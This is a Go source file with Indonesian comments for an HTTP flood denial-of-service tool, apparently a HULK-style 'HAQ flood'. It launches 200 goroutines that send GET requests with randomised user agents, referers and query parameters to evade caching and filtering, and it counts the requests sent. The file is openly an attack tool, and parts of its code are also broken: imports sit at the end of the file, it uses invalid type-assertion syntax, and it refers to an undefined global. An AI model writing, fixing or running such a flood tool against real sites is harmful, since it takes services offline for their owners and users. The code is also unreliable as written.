package main

import (
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic" // Untuk counter yang aman antar-goroutine
	"time"
)

// --- Konfigurasi ---
const (
	numThreads         = 200 // Jumlah goroutine worker
	randomStringMin    = 3
	randomStringMax    = 10
	keepAliveMin       = 110
	keepAliveMax       = 120
	reportIntervalSec  = 5 // Detik
	requestTimeoutSec  = 15 // Detik
)

// --- Data Statis ---
var userAgents = []string{
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
}

var referers = []string{
	"http://www.google.com/?q=",
	"http://www.usatoday.com/search/results?q=",
	"http://engadget.search.aol.com/search?q=",
}

// --- State Management ---
type AttackState struct {
	requestCounter  atomic.Uint64 // Gunakan atomic untuk thread-safe counter
	stopAttack      chan struct{} // Channel untuk memberi sinyal berhenti
	attackFinished  chan struct{} // Channel untuk menandai serangan selesai
	host            string
	targetURL       string
	safeMode        bool
	debugMode       bool
	hostFullURL     string // Menyimpan scheme://host
}

func newState() *AttackState {
	return &AttackState{
		stopAttack:     make(chan struct{}),
		attackFinished: make(chan struct{}),
	}
}

func (s *AttackState) SetTarget(targetURL string) error {
	u, err := url.Parse(targetURL)
	if err != nil {
		return fmt.Errorf("URL target tidak valid: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return fmt.Errorf("skema URL harus 'http' atau 'https'")
	}
	s.targetURL = targetURL
	s.hostFullURL = fmt.Sprintf("%s://%s", u.Scheme, u.Host) // scheme://host:port
	s.host = u.Host // Hanya host:port
	referers = append(referers, s.hostFullURL+"/") // Tambahkan referer dinamis
	return nil
}

func (s *AttackState) Stop() {
	// Pastikan channel hanya ditutup sekali
	select {
	case <-s.stopAttack:
		// Sudah ditutup
	default:
		close(s.stopAttack)
	}
}

func (s *AttackState) Finish() {
	select {
	case <-s.attackFinished:
		// Sudah ditutup
	default:
		close(s.attackFinished)
	}
}

func (s *AttackState) IsStopped() bool {
	select {
	case <-s.stopAttack:
		return true
	default:
		return false
	}
}

func (s *AttackState) IsFinished() bool {
	select {
	case <-s.attackFinished:
		return true
	default:
		return false
	}
}

// --- Helper Functions ---
func buildRandomString(size int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, size)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func getRandomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func getRandomReferer() string {
	ref := referers[rand.Intn(len(referers))]
	// Pastikan referer tidak sama persis dengan host tujuan sebelum menambahkan string acak
	if ref == strings.TrimSuffix(state.hostFullURL+"/", "//") { // Perlu penanganan edge case host
		return ref + buildRandomString(rand.Intn(randomStringMax-randomStringMin+1)+randomStringMin)
	}
	return ref + buildRandomString(rand.Intn(randomStringMax-randomStringMin+1)+randomStringMin)
}

func createHTTPRequest(targetURL string, host string) (*http.Request, error) {
	// Tambahkan parameter acak
	paramJoiner := "?"
	if strings.Contains(targetURL, "?") {
		paramJoiner = "&"
	}
	randomParamName := buildRandomString(rand.Intn(randomStringMax-randomStringMin+1) + randomStringMin)
	randomParamValue := buildRandomString(rand.Intn(randomStringMax-randomStringMin+1) + randomStringMin)
	finalURL := targetURL + paramJoiner + randomParamName + "=" + randomParamValue

	req, err := http.NewRequest("GET", finalURL, nil) // nil untuk body karena ini GET request
	if err != nil {
		return nil, fmt.Errorf("gagal membuat request: %w", err)
	}

	// Tambahkan header
	req.Header.Set("User-Agent", getRandomUserAgent())
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
	req.Header.Set("Referer", getRandomReferer())
	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(keepAliveMax-keepAliveMin+1)+keepAliveMin))
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", host) // Gunakan host:port

	return req, nil
}

// --- Goroutines ---

func worker(state *AttackState, wg *sync.WaitGroup) {
	defer wg.Done() // Pastikan WaitGroup di-decrement saat goroutine selesai

	// Gunakan http.Client dengan Transport yang dikonfigurasi untuk timeout
	transport := &http.Transport{
		MaxIdleConns:          100, // Sesuaikan jika perlu
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second, // Timeout untuk TLS handshake
		ResponseHeaderTimeout: time.Duration(requestTimeoutSec) * time.Second, // Timeout untuk baca header respons
		ExpectContinueTimeout: 1 * time.Second,
		DialContext: (&net.Dialer{ // Gunakan DialContext untuk timeout dial TCP
			Timeout:   10 * time.Second, // Timeout untuk dial TCP
			KeepAlive: 30 * time.Second,
		}).DialContext,
		Proxy: http.ProxyFromEnvironment, // Gunakan proxy dari environment jika ada
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   time.Duration(requestTimeoutSec) * time.Second, // Timeout global untuk seluruh request
	}

	for {
		select {
		case <-state.stopAttack:
			if state.debugMode {
				fmt.Printf("[DEBUG GOROUTINE %d] Menerima sinyal berhenti.\n", getGoroutineID())
			}
			return // Keluar dari goroutine
		default:
			// Lanjutkan ke pengiriman request
		}

		req, err := createHTTPRequest(state.targetURL, state.host)
		if err != nil {
			if state.debugMode {
				fmt.Printf("[DEBUG GOROUTINE %d] Error createHTTPRequest: %v\n", getGoroutineID(), err)
			}
			// Jika error saat membuat request, mungkin ada masalah fundamental.
			// Terus loop untuk mencoba lagi atau hentikan jika error kritis.
			// Di sini kita terus mencoba.
			time.Sleep(100 * time.Millisecond) // Jeda sebelum mencoba lagi
			continue
		}

		resp, err := client.Do(req)
		state.requestCounter.Add(1) // Increment counter untuk setiap upaya request (sukses/gagal)

		if err != nil {
			if state.debugMode {
				fmt.Printf("[DEBUG GOROUTINE %d] Error client.Do: %v\n", getGoroutineID(), err)
			}
			// Tangani berbagai jenis error
			if strings.Contains(err.Error(), "timed out") || err.(type) == net.Error.(type) && err.(net.Error).Timeout() {
				if state.debugMode {
					fmt.Printf("[DEBUG GOROUTINE %d] Timeout terdeteksi pada request ke %s\n", getGoroutineID(), state.targetURL)
				}
				// Jika timeout, ini adalah respons yang diharapkan dalam skenario DoS
				// Terus loop untuk mencoba lagi
			} else if strings.Contains(err.Error(), "refused") {
				// Koneksi ditolak
				if state.debugMode {
					fmt.Printf("[DEBUG GOROUTINE %d] Koneksi ditolak oleh server: %s\n", getGoroutineID(), state.targetURL)
				}
			} else {
				// Error tak terduga lainnya
				fmt.Printf("\n[ERROR GOROUTINE %d] Error tak terduga: %v\n", getGoroutineID(), err)
				state.Stop() // Hentikan serangan jika ada error yang tidak terduga
				return
			}
			// Jika terjadi error, baca body respon untuk membersihkannya jika ada, tapi jangan cek status
			if resp != nil {
				io.Copy(io.Discard, resp.Body) // Buang isi body
				resp.Body.Close()
			}
			// Setelah error, tunggu sebentar sebelum goroutine berikutnya mengambil tugas
			time.Sleep(100 * time.Millisecond)
			continue // Lanjutkan ke iterasi berikutnya
		}

		// Jika tidak ada error, berarti request berhasil setidaknya sampai mendapatkan respons
		if state.debugMode {
			fmt.Printf("[DEBUG GOROUTINE %d] Sukses: Status %d untuk %s\n", getGoroutineID(), resp.StatusCode, state.targetURL)
		}

		// Periksa Safe Mode
		if state.safeMode && resp.StatusCode >= 500 {
			fmt.Printf("\n[INFO] Terdeteksi Response Code %d. Mode aman aktif, menghentikan serangan.\n", resp.StatusCode)
			state.Stop()
			// Tidak perlu return di sini, loop akan berhenti karena state.Stop()
		}

		// Penting: Baca dan tutup body respon, bahkan jika tidak digunakan,
		// agar koneksi dapat digunakan kembali atau ditutup dengan benar.
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		// Jika serangan dihentikan saat loop ini berjalan, keluar
		if state.IsStopped() {
			return
		}

		// Tambahkan sedikit delay acak di antara request untuk menghindari rate limiting yang terlalu ketat
		// Ini opsional, tergantung strategi serangan. Untuk DoS murni, ini mungkin tidak diinginkan.
		// time.Sleep(time.Duration(rand.Intn(50)) * time.Millisecond)

	}
}

func monitor(state *AttackState, wg *sync.WaitGroup) {
	defer wg.Done()
	lastReportTime := time.Now()

	ticker := time.NewTicker(time.Second) // Cek setiap detik
	defer ticker.Stop()

	for {
		select {
		case <-state.stopAttack:
			if state.debugMode {
				fmt.Printf("[DEBUG MONITOR] Menerima sinyal berhenti.\n")
			}
			// Setelah menerima sinyal stop, kita mungkin ingin melaporkan sekali lagi
			// sebelum selesai, tapi state.attackFinished akan menandai akhir program.
			return // Keluar dari goroutine monitor
		case <-ticker.C:
			currentTime := time.Now()
			if currentTime.Sub(lastReportTime) >= time.Duration(reportIntervalSec)*time.Second {
				requestsSent := state.requestCounter.Load()
				fmt.Printf("[%s] Request terkirim: %d\n", time.Now().Format("15:04:05"), requestsSent)
				lastReportTime = currentTime
			}
		}
	}
}

// Helper untuk mendapatkan ID goroutine (untuk debugging)
// Ini tidak dijamin stabil antar versi Go, tapi berguna untuk debugging
func getGoroutineID() uint64 {
    var buf [64]byte
    n := runtime.Stack(buf[:], false)
    idField := strings.Fields(string(buf[:n]))[0]
    id, _ := strconv.ParseUint(idField, 10, 64)
    return id
}


// --- Main Function ---
func main() {
	// Seed generator angka acak
	rand.Seed(time.Now().UnixNano())

	// Parse command line arguments
	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}

	targetURL := os.Args[1]
	safeMode := false
	debugMode := false

	for i := 2; i < len(os.Args); i++ {
		if strings.ToLower(os.Args[i]) == "safe" {
			safeMode = true
		} else if strings.ToLower(os.Args[i]) == "debug" {
			debugMode = true
		}
	}

	state := newState()
	state.safeMode = safeMode
	state.debugMode = debugMode

	if err := state.SetTarget(targetURL); err != nil {
		fmt.Fprintf(os.Stderr, "[ERROR] %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[INFO] Menargetkan: %s\n", state.targetURL)
	fmt.Printf("[INFO] Host: %s\n", state.host)
	fmt.Printf("[INFO] Jumlah goroutine: %d\n", numThreads)
	if state.safeMode {
		fmt.Println("[INFO] Mode aman (safe) diaktifkan.")
	}
	if state.debugMode {
		fmt.Println("[INFO] Mode debug diaktifkan.")
	}
	fmt.Println("[INFO] -- Memulai HAQ flood --")
	var wg sync.WaitGroup

	// Mulai goroutine monitor
	wg.Add(1)
	go monitor(state, &wg)

	// Mulai goroutine worker
	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go worker(state, &wg)
	}

	// Tunggu sampai monitor memberi sinyal bahwa serangan selesai
	// Ini akan menunggu sampai monitor menerima sinyal stop, lalu keluar.
	// Namun, kita perlu menunggu worker juga selesai, jadi kita gunakan WaitGroup
	// dan juga mekanisme stop channel.

	// Cara yang lebih baik adalah menunggu state.attackFinished
	// Namun, attackFinished diset oleh monitor. Jadi kita perlu memastikan monitor
	// punya cara untuk memberitahu main goroutine bahwa ia selesai.
	// Atau, kita bisa menggunakan WaitGroup di akhir.

	// Menunggu semua goroutine worker dan monitor selesai
	wg.Wait()

	// Pastikan attackFinished diset setelah semua goroutine selesai (terutama monitor)
	// Jika monitor sudah memanggil state.Finish(), ini tidak masalah.
	state.Finish() // Tandai bahwa proses selesai

	fmt.Printf("\n[INFO] Total request terkirim: %d\n", state.requestCounter.Load())
	fmt.Println("[INFO] -- Serangan Selesai --")
}

func printUsage() {
	fmt.Println("PENGGUNAAN: go run nama_file.go <url> [safe] [debug]")
	fmt.Println("  <url>: Alamat target (http:// atau https://)")
	fmt.Println("  [safe]: Opsional. Berhenti otomatis jika response code >= 500.")
	fmt.Println("  [debug]: Opsional. Aktifkan mode debug untuk log detail.")
}

// --- Helper untuk Debugging ID Goroutine ---
// Diperlukan runtime package
import "runtime"
import "net" // Untuk DialContext
